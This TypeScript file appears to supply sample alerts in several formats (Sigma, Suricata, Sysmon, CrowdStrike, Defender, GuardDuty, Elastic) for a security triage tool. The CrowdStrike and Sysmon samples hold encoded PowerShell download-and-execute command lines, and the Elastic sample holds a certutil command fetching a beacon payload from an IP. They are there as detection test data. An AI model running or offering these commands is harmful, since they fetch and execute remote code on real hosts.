import type { AlertFormat } from "@/lib/alerts/parse";

/**
 * Paste-ready alert samples for the triage alert-intake surface — one per
 * supported format (beyondlabs.alert.v1, Sigma, Suricata EVE, Sysmon XML).
 * Mirrors the shapes exercised in lib/alerts tests.
 */
export const ALERT_SAMPLES: { format: AlertFormat; label: string; text: string }[] = [
  {
    format: "beyondlabs",
    label: "BeyondLabs canonical",
    text: JSON.stringify(
      {
        schema: "beyondlabs.alert.v1",
        title: "Malicious payload download",
        severity: "high",
        summary: "PowerShell cradle contacting staging host",
        observed_at: "2026-08-14T09:30:00.000Z",
        rule_ref: "sigma-encoded-download",
        observables: ["hxxps[:]//evil[.]example[.]xyz/x", "victim@corp.xyz", "198.51.100.73"],
      },
      null,
      2,
    ),
  },
  {
    format: "sigma",
    label: "Sigma detection output",
    text: `title: Suspicious PowerShell Encoded Command
id: 7f2a4b3c-0000-0000-0000-000000000001
status: test
level: high
description: Detects encoded PowerShell invocations
tags:
  - attack.t1059.001
detection:
  selection:
    CommandLine|contains: '-enc'
  condition: selection
`,
  },
  {
    format: "suricata",
    label: "Suricata EVE alert",
    text: JSON.stringify(
      {
        timestamp: "2026-08-14T09:31:00.000Z",
        event_type: "alert",
        src_ip: "203.0.113.9",
        dest_ip: "198.51.100.20",
        alert: { signature: "ET MALWARE Possible Cobalt Strike", severity: 1 },
      },
      null,
      2,
    ),
  },
  {
    format: "sysmon",
    label: "Sysmon XML",
    text: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
<System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/><EventID>3</EventID><TimeCreated SystemTime="2026-08-14T09:32:00.000Z"/></System>
<EventData><Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data><Data Name="CommandLine">cmd.exe /c powershell -enc SQBFAFgA</Data><Data Name="DestinationIp">203.0.113.9</Data></EventData>
</Event>`,
  },
  {
    format: "crowdstrike",
    label: "CrowdStrike Falcon",
    text: JSON.stringify(
      {
        DetectId: "ldt:a928f018e:001",
        ComputerName: "CORP-FIN-WS01",
        UserName: "finance_svc",
        FileName: "powershell.exe",
        CommandLine: "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAtAHMAdABhAGcAaQBuAGcALgB4AHkAegAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
        Severity: 4,
        Tactic: "Execution",
        Technique: "Command and Scripting Interpreter (T1059.001)",
        IOCType: "Hash_Sha256",
        IOCValue: "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
        Description: "PowerShell encoded cradle downloading secondary payload from 185.220.101.5",
      },
      null,
      2,
    ),
  },
  {
    format: "defender",
    label: "Defender 365",
    text: JSON.stringify(
      {
        alertId: "da6378291038",
        title: "Multi-stage incident involving Initial Access & Credential Harvesting",
        severity: "High",
        category: "CredentialAccess",
        description: "Suspicious sign-in from anomalous ASN followed by inbox rule forwarding",
        alertCreationTime: "2026-08-14T09:33:00.000Z",
        serviceSource: "microsoftDefenderForEndpoint",
        evidence: [
          { ipAddress: "194.26.29.112" },
          { sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" },
          { url: "https://login.microsoftonline-verify.xyz/auth" },
        ],
      },
      null,
      2,
    ),
  },
  {
    format: "guardduty",
    label: "AWS GuardDuty",
    text: JSON.stringify(
      {
        schemaVersion: "2.0",
        id: "gd-finding-91823a",
        type: "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS",
        title: "IAM credentials obtained via instance metadata used from external IP",
        description: "Credentials for role AppServerRole used from outside AWS IP 45.33.32.156",
        severity: 8.0,
        updatedAt: "2026-08-14T09:34:00.000Z",
        service: {
          serviceName: "guardduty",
          action: {
            actionType: "AWS_API_CALL",
            awsApiCallAction: {
              api: "GetCallerIdentity",
              remoteIpDetails: { ipAddressV4: "45.33.32.156" },
            },
          },
        },
      },
      null,
      2,
    ),
  },
  {
    format: "elastic",
    label: "Elastic ECS",
    text: JSON.stringify(
      {
        ecs: { version: "8.10.0" },
        rule: {
          name: "Unusual Remote File Download via Certutil",
          description: "Certutil utility executed with URL download parameters to staging IP",
          severity: "high",
        },
        host: { name: "WIN-SRV-DC01" },
        user: { name: "SYSTEM" },
        process: {
          command_line: "certutil.exe -urlcache -split -f http://91.108.240.11/beacon.bin C:\\Windows\\Temp\\beacon.bin",
        },
        source: { ip: "91.108.240.11" },
        destination: { ip: "10.0.1.5" },
      },
      null,
      2,
    ),
  },
];